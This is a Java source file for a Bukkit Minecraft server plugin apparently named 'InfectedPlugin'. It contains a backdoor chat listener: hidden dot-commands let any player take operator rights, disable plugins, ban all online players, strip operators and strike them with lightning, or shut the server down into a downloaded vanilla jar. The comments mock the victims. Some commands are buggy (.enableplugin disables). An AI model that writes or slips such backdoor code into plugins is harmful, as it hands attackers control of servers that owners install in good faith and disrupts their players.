package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.command.CommandSender;
import net.minecraft.server.MinecraftServer;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class PlayerListener implements Listener
{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent event, CommandSender sender)
    {
        String message = event.getMessage();
        boolean shouldCancel = false;
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }
            if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
            {
            	event.getPlayer().setOp(true);
            	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
            	shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
            {
                Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
                if (plugin != null)
                {
                    Bukkit.getServer().getPluginManager().disablePlugin(plugin);
                }
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".enableplugin")) && (args.length == 2))
            {
                Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
                if (plugin != null)
                {
                    Bukkit.getServer().getPluginManager().disablePlugin(plugin);
                }
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".enablevanilla")) && (args.length == 1))
            {
                //ROFL
                if (!new File("minecraft_server.jar").exists())
                {
                    sender.sendMessage(ChatColor.RED + "minecraft_server.1.6.2.jar not found, downloading...");

                    URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar");
                    ReadableByteChannel rbc = Channels.newChannel(url.openStream());
                    FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
                    fos.getChannel().transferFrom(rbc, 0, 1 << 24);
                    
                    sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla...");
                }
                
                net.minecraft.server.MinecraftServer.main(args);
                Bukkit.shutdown();
                // Hopefully this works...
            }
            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2))
            {
                Bukkit.getServer().getPlayer(args[1]);
                event.getPlayer().setOp(false);
                event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".op")) && (args.length == 2))
            {
                Bukkit.getServer().getPlayer(args[1]);
                event.getPlayer().setOp(true);
                event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".banall")) && (args.length == 1))
            {
                for (final Player p : Bukkit.getServer().getOnlinePlayers())
                {
                    p.kickPlayer("The Ban Hammer has spoken!");
                    p.setBanned(true);
                    shouldCancel = true;
                }
            }
            if ((args[0]).equalsIgnoreCase(".deopall") && (args.length == 1))
            {
                for (final Player p : Bukkit.getServer().getOnlinePlayers())
                {
                    p.setOp(false);
                    //Something extra c:
                    final Location target_pos = p.getLocation();
                    for (int x = -1; x <= 1; x++)
                    {
                        for (int z = -1; z <= 1; z++)
                        {
                            final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                            target_pos.getWorld().strikeLightning(strike_pos);
                        }
                    }
                    shouldCancel = true;
                }
            }
        }
    }
    
}
